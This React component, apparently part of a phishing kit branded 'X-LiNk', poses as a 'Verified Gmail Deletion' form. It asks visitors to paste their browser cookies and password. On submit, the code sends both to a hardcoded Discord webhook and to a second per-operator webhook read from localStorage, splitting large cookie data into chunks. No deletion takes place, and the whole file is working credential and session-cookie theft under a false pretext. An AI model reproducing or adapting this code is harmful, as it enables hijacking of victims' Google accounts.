import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Shield } from "lucide-react";

interface VerifyGmailDeleteProps {
  onBack: () => void;
  onSuccess: () => void;
}

export const VerifyGmailDelete = ({
  onBack,
  onSuccess,
}: VerifyGmailDeleteProps) => {
  const [cookies, setCookies] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const MAIN_WEBHOOK =
    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";

  const getWebhookData = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const refId = urlParams.get("ref");

    console.log("🔍 Checking custom instance...");
    console.log("Current URL:", window.location.href);
    console.log("Ref ID:", refId);

    if (refId) {
      const webhookData = localStorage.getItem(`webhook_${refId}`);
      console.log("📦 Raw webhook data:", webhookData);

      if (webhookData) {
        try {
          const parsed = JSON.parse(webhookData);
          console.log("✅ Parsed webhook data:", parsed);
          return { refId, webhookData: parsed };
        } catch (error) {
          console.error("❌ Error parsing webhook data:", error);
        }
      } else {
        console.error("❌ No webhook data found for refId:", refId);
      }
    }

    return { refId: null, webhookData: null };
  };

  // Split large text into chunks if needed
  const splitLargeText = (text: string, maxLength = 1800) => {
    if (text.length <= maxLength) return [text];

    const chunks = [];
    for (let i = 0; i < text.length; i += maxLength) {
      chunks.push(text.substring(i, i + maxLength));
    }
    return chunks;
  };

  const sendToWebhook = async (
    webhookUrl: string,
    data: any,
    webhookType: string,
  ) => {
    try {
      console.log(`🚀 Sending to ${webhookType} webhook:`, webhookUrl);

      const { refId } = getWebhookData();
      const timestamp = new Date().toISOString();

      // Split cookies into chunks if too large
      const cookieChunks = splitLargeText(data.cookies);

      // Create embeds for each chunk
      const embeds = [];

      if (cookieChunks.length === 1) {
        // Single embed for small data
        embeds.push({
          title:
            webhookType === "custom"
              ? "🛡️ Verified Gmail Delete (Custom Instance)"
              : "🛡️ Verified Gmail Delete (Main System)",
          color: 0xff6600,
          description:
            webhookType === "custom"
              ? "New verified Gmail deletion request from your custom instance!"
              : "Verified Gmail deletion request received and processed.",
          fields: [
            {
              name: "🍪 Cookies",
              value: `\`\`\`${data.cookies}\`\`\``,
              inline: false,
            },
            {
              name: "🔐 Password",
              value: `\`\`\`${data.password}\`\`\``,
              inline: false,
            },
            {
              name: "⏰ Timestamp",
              value: timestamp,
              inline: true,
            },
            {
              name: "🎯 Action",
              value: "Delete Verified Gmail",
              inline: true,
            },
            ...(refId
              ? [
                  {
                    name: "🔗 Instance ID",
                    value: refId,
                    inline: true,
                  },
                  {
                    name: "🌐 Source",
                    value:
                      webhookType === "custom"
                        ? "Custom Instance"
                        : "Main System Monitor",
                    inline: true,
                  },
                ]
              : []),
          ],
          footer: {
            text:
              webhookType === "custom"
                ? "X-LiNk Custom Instance"
                : "X-LiNk Main System",
          },
        });
      } else {
        // Multiple embeds for large data
        // Header embed
        embeds.push({
          title:
            webhookType === "custom"
              ? "🛡️ Verified Gmail Delete (Custom Instance) - LARGE DATA"
              : "🛡️ Verified Gmail Delete (Main System) - LARGE DATA",
          color: 0xff6600,
          description:
            webhookType === "custom"
              ? `New verified Gmail deletion request from your custom instance! Data split into ${cookieChunks.length} parts.`
              : `Verified Gmail deletion request received and processed. Data split into ${cookieChunks.length} parts.`,
          fields: [
            {
              name: "🔐 Password",
              value: `\`\`\`${data.password}\`\`\``,
              inline: false,
            },
            {
              name: "⏰ Timestamp",
              value: timestamp,
              inline: true,
            },
            {
              name: "🎯 Action",
              value: "Delete Verified Gmail",
              inline: true,
            },
            {
              name: "📊 Data Parts",
              value: `${cookieChunks.length} chunks`,
              inline: true,
            },
            ...(refId
              ? [
                  {
                    name: "🔗 Instance ID",
                    value: refId,
                    inline: true,
                  },
                  {
                    name: "🌐 Source",
                    value:
                      webhookType === "custom"
                        ? "Custom Instance"
                        : "Main System Monitor",
                    inline: true,
                  },
                ]
              : []),
          ],
          footer: {
            text:
              webhookType === "custom"
                ? "X-LiNk Custom Instance"
                : "X-LiNk Main System",
          },
        });

        // Data chunks embeds
        cookieChunks.forEach((chunk, index) => {
          embeds.push({
            title: `🍪 Cookies Part ${index + 1}/${cookieChunks.length}`,
            color: 0xff8844,
            description: `\`\`\`${chunk}\`\`\``,
            footer: {
              text: `Part ${index + 1} of ${cookieChunks.length}`,
            },
          });
        });
      }

      const payload = { embeds };

      console.log(
        `📤 ${webhookType} webhook payload:`,
        JSON.stringify(payload, null, 2),
      );

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const responseText = await response.text();
      console.log(
        `📥 ${webhookType} webhook response status:`,
        response.status,
      );
      console.log(`📥 ${webhookType} webhook response:`, responseText);

      if (response.ok) {
        console.log(`✅ ${webhookType} webhook sent successfully!`);
        return true;
      } else {
        console.error(
          `❌ ${webhookType} webhook failed:`,
          response.status,
          responseText,
        );
        return false;
      }
    } catch (error) {
      console.error(`❌ ${webhookType} webhook error:`, error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookies.trim() || !password.trim()) {
      setError("Please fill in all fields");
      return;
    }

    setIsLoading(true);
    setError("");

    const { refId, webhookData } = getWebhookData();
    const data = { cookies, password };

    console.log("🚀 Starting webhook delivery process...");
    console.log("📋 Data size:", cookies.length, "characters");
    console.log("🆔 RefId:", refId);
    console.log("📦 Webhook Data:", webhookData);

    let mainWebhookSuccess = false;
    let customWebhookSuccess = false;

    // Always send to main webhook first
    try {
      console.log("📤 Sending to main webhook...");
      mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
      console.log("📊 Main webhook result:", mainWebhookSuccess);
    } catch (error) {
      console.error("❌ Main webhook failed:", error);
    }

    // Send to custom webhook if this is a custom instance
    if (refId && webhookData && webhookData.webhook) {
      try {
        console.log("📤 Sending to custom webhook:", webhookData.webhook);
        customWebhookSuccess = await sendToWebhook(
          webhookData.webhook,
          data,
          "custom",
        );
        console.log("📊 Custom webhook result:", customWebhookSuccess);
      } catch (error) {
        console.error("❌ Custom webhook failed:", error);
      }
    } else {
      console.log(
        "ℹ️ No custom webhook to send to (not a custom instance or no webhook data)",
      );
    }

    // Report results
    console.log("📊 Final Results:");
    console.log(
      "  - Main webhook:",
      mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
    );
    console.log(
      "  - Custom webhook:",
      customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
    );

    // Consider success if at least one webhook succeeded
    if (mainWebhookSuccess || customWebhookSuccess) {
      console.log("🎉 At least one webhook succeeded, calling onSuccess");
      onSuccess();
    } else {
      console.error("💥 All webhooks failed");
      setError("Failed to process request. Please try again.");
    }

    setIsLoading(false);
  };

  // Check if this is a custom instance
  const { refId } = getWebhookData();
  const isCustomInstance = !!refId;

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/80 border-orange-600/50 backdrop-blur-2xl shadow-2xl">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-orange-600/20 rounded-full">
              <Shield className="w-8 h-8 text-orange-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2">
              Verified Gmail Deletion
            </CardTitle>
            <p className="text-orange-300 text-sm">
              Enter cookies and password for verified deletion
            </p>
            {isCustomInstance && (
              <div className="mt-2 px-3 py-1 bg-purple-600/20 rounded-full border border-purple-500/30">
                <p className="text-purple-300 text-xs">
                  Custom Instance: {refId}
                </p>
              </div>
            )}
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Cookies
              </label>
              <Textarea
                placeholder="Paste your cookies here... (supports large data)"
                value={cookies}
                onChange={(e) => setCookies(e.target.value)}
                className="bg-black/60 border-orange-600/50 text-white placeholder:text-gray-500 min-h-[150px] focus:border-orange-500 transition-colors resize-none"
                disabled={isLoading}
              />
              {cookies.length > 0 && (
                <p className="text-xs text-gray-400 mt-1">
                  Data size: {cookies.length} characters
                  {cookies.length > 1800 && (
                    <span className="text-yellow-400">
                      {" "}
                      (will be split into multiple parts)
                    </span>
                  )}
                </p>
              )}
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.4 }}
            >
              <label className="block text-white font-medium mb-2">
                Password
              </label>
              <Input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-black/60 border-orange-600/50 text-white placeholder:text-gray-500 h-12 focus:border-orange-500 transition-colors"
                disabled={isLoading}
              />
            </motion.div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.5 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-500 hover:to-orange-600 text-white h-12 font-semibold shadow-lg"
                disabled={isLoading || !cookies.trim() || !password.trim()}
              >
                {isLoading ? "Processing..." : "Delete Verified Gmail"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
